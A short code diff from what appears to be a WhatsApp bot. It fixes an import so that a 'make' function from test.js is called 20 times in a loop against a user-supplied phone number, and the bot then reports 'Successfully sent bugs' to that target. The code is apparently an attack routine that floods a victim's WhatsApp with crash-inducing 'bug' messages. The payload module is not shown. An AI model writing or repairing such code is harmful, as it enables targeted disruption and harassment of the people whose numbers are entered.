@@ -162,7 +162,7 @@ const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, che
 const orgkaya = JSON.parse(fs.readFileSync('./database/premium.json'))
 const zetsQuoted = fs.readFileSync(`./media/spider.jpg`)
 const testi  = fs.readFileSync(`./test.txt`)
-const make = require('./test.js')
+const { make } = require('./test.js')
 
 //=================================================//
 //Group
@@ -1233,7 +1233,7 @@ if (num.startsWith('0')) return reply(`Number cannot start with 0 \n\n<✓> Exam
 let target = num + '@s.whatsapp.net'
 await reply("processing....")
 for (let j = 0; j < 20; j++) {
-await test(target)
+await make(target)
 }
 await reply(`Successfully sent bugs to ${target} using ${command}`)
 }
